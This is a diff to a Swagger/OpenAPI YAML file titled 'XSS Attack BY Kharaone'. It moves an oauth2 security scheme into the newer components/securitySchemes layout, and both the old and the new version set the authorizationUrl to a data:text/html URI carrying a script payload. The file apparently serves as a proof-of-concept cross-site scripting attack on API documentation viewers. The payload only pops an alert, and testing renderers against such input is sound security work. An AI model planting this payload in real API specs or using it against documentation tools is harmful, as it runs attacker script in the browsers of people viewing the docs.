@@ -1,10 +1,15 @@
 swagger: '2.0'
-securityDefinitions:
-  basicAuth:
-    type: basic
-  a:
-    type: oauth2
-    authorizationUrl: data:text/html,<script>alert(0)</script>
+components:
+  securitySchemes:
+    oAuthNoScopes:
+      type: oauth2
+      flows: 
+        implicit: 
+          authorizationUrl: data:text/html,<script>alert(0)</script>
+          scopes: {}
+security:
+  - basicAuth: []
+  - oAuthNoScopes: []
 info:
   title: XSS Attack BY Kharaone
   description: |
@@ -18,8 +23,6 @@ produces:
 consumes:
   - application/xml
   - application/json
-security:
-  - basicAuth: []
 paths:
   /Kharaone:
     get:
